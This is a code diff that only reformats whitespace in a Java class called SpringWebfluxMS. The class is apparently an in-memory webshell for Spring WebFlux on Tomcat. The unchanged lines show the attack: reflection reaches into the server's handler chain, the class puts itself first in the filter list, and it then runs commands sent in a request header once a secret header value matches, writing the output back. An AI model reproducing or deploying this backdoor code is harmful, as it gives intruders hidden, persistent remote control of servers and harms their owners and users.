@@ -39,7 +39,7 @@ public class SpringWebfluxMS implements WebFilter, Function<MultiValueMap<String
             Class.forName("org.apache.catalina.loader.WebappClassLoaderBase");
             ClassLoader loader = Thread.currentThread().getContextClassLoader();
 
-            Map    map     = (Map) getFieldValue(getFieldValue(getFieldValue(loader, "resources"), "context"), "children");
+            Map map = (Map) getFieldValue(getFieldValue(getFieldValue(loader, "resources"), "context"), "children");
             Object servlet = map.get("httpHandlerServlet");
             filteringWebHandler = (FilteringWebHandler) getFieldValue(getFieldValue(getFieldValue(getFieldValue(
                     getFieldValue(servlet, "existing"), "httpHandler"), "delegate"), "delegate"), "delegate");
@@ -67,11 +67,11 @@ public class SpringWebfluxMS implements WebFilter, Function<MultiValueMap<String
         if (filteringWebHandler != null) {
             try {
                 DefaultWebFilterChain defaultWebFilterChain = (DefaultWebFilterChain) getFieldValue(filteringWebHandler, "chain");
-                Object                handler               = getFieldValue(defaultWebFilterChain, "handler");
-                List<WebFilter>       newAllFilters         = new ArrayList<WebFilter>(defaultWebFilterChain.getFilters());
+                Object handler = getFieldValue(defaultWebFilterChain, "handler");
+                List<WebFilter> newAllFilters = new ArrayList<WebFilter>(defaultWebFilterChain.getFilters());
                 newAllFilters.add(0, new SpringWebfluxMS());
                 DefaultWebFilterChain newChain = new DefaultWebFilterChain((WebHandler) handler, newAllFilters);
-                Field                 f        = filteringWebHandler.getClass().getDeclaredField("chain");
+                Field f = filteringWebHandler.getClass().getDeclaredField("chain");
                 f.setAccessible(true);
                 Field modifersField = Field.class.getDeclaredField("modifiers");
                 modifersField.setAccessible(true);
@@ -114,7 +114,7 @@ public class SpringWebfluxMS implements WebFilter, Function<MultiValueMap<String
     @Override
     public Mono<Void> filter(ServerWebExchange exchange, WebFilterChain chain) {
         String value = exchange.getRequest().getHeaders().getFirst(HEADER_KEY);
-        String cmd   = exchange.getRequest().getHeaders().getFirst(CMD_HEADER);
+        String cmd = exchange.getRequest().getHeaders().getFirst(CMD_HEADER);
         if (value != null && value.contains(HEADER_VALUE)) {
             Mono bufferStream = exchange.getFormData().flatMap(new SpringWebfluxMS(cmd));
             return exchange.getResponse().writeWith(bufferStream);
